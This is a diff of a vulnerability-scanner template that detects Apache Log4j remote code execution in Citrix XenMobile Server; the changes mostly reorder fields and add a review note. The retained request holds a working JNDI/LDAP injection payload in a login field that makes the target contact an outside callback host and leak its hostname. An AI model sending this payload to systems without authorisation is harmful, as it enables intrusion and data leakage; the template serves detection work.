@@ -1,5 +1,4 @@
 id: xenmobile-server-log4j-rce
-
 info:
   name: Citrix XenMobile Server - Remote Code Execution (Apache Log4j)
   author: DhiyaneshDK
@@ -14,18 +13,46 @@ info:
     cwe-id: CWE-502
     cpe: cpe:2.3:a:citrix:xenmobile_server:*:*:*:*:*:*:*:*
   metadata:
-    verified: true
+    runzero-review: REJECT/2025-11-07/uses interactsh
     max-request: 1
-    shodan-query: title:"XenMobile"
     product: xenmobile_server
+    shodan-query: title:"XenMobile"
     vendor: citrix
-  tags: cve,cve2021,rce,jndi,log4j,xenmobile,oast,kev,vuln
+    verified: true
+  tags: cve,cve2021,jndi,kev,log4j,oast,rce,vuln,xenmobile
 variables:
   rand1: '{{rand_int(111, 999)}}'
   rand2: '{{rand_int(111, 999)}}'
-
 http:
-  - raw:
+  - extractors:
+      - kval:
+          - interactsh_ip
+        type: kval
+      - group: 2
+        part: interactsh_request
+        regex:
+          - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
+        type: regex
+      - group: 1
+        part: interactsh_request
+        regex:
+          - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
+        type: regex
+    matchers:
+      - part: body
+        type: word
+        words:
+          - <h1>500 Server Internal Error
+      - part: interactsh_protocol
+        type: word
+        words:
+          - dns
+      - part: interactsh_request
+        regex:
+          - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
+        type: regex
+    matchers-condition: and
+    raw:
       - |
         @timeout: 20s
         POST /zdm/cxf/login HTTP/1.1
@@ -37,38 +64,3 @@ http:
         Referer: {{BaseURL}}/zdm/login_xdm_uc.jsp
 
         login=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.postdata.{{interactsh-url}}}&password=admin
-
-    matchers-condition: and
-    matchers:
-      - type: word
-        part: body
-        words:
-          - '<h1>500 Server Internal Error'
-
-      - type: word
-        part: interactsh_protocol # Confirms the DNS Interaction
-        words:
-          - "dns"
-
-      - type: regex
-        part: interactsh_request
-        regex:
-          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
-
-    extractors:
-      - type: kval
-        kval:
-          - interactsh_ip
-
-      - type: regex
-        part: interactsh_request
-        group: 2
-        regex:
-          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
-
-      - type: regex
-        part: interactsh_request
-        group: 1
-        regex:
-          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
-# digest: 4a0a00473045022003a1e0c3b15153031b9a21d81439af9b4a90908a373a6e26842cc38377f3fb0c0221008d7a0ec17bb6ce48432ab59dd1b70580b7debdf5daf433c12b6baa26a6e48686:922c64590222798bb761d5b6d8e72950
